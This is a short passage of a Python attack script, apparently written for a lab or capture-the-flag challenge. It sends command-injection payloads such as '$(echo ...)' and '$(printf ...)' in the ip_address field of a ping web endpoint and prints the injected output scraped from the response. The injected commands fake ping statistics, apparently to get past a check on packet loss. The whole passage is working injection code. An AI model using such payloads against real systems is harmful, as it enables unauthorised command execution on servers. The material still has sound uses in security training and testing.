payload1 = '$(echo "5 packets transmitted, 3 received, 40% packet loss")'
print(f"[*] Payload: {payload1}")

response = requests.post(ping_endpoint, data={"ip_address": payload1}, timeout=10)
match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if match:
    print(f"[+] Response: {match.group(1)}")

print("\n" + "="*60)
print("[*] Approach 2: Using printf without quotes (may need different escaping)")
payload2 = '$(printf "5 packets transmitted, 3 received, 40% packet loss\n")'
